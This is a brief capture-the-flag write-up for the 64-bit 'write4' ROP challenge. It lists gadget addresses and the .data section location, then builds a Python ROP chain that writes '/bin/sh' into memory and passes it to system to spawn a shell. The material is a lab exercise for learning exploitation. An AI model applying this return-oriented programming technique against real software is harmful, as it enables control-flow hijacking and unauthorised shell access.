# write4 - 64bit

Once again, the 64bit version is the same concept to that of the 32bit exploit.

Searching for the same format gives us the gadgets below:
```
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
```

These will allow us to load a string into memory. Due to the 8 bit size of 64-bit pointers we can load "/bin/sh" into memory with a single call.

As with the `32-bit` version the data is being written to `.data` section.

```
$ readelf --sections write4 | grep .data
[25] .data             PROGBITS         0000000000601050  0000105
```

The final stage is loading the address of the string into the `rdi` register for the system call.

```
0x0000000000400893 : pop rdi ; ret
```

This, therefore, creates a ROP chain like so:

```python
payload = b""
payload += junk
payload += g_pop        # pop r14 ; pop r15 ; ret
payload += data_addr    
payload += command
payload += g_mov        # mov qword ptr [r14], r15 ; ret
payload += pop_rdi      # pop rdi ; ret
payload += data_addr    
payload += sys_addr
```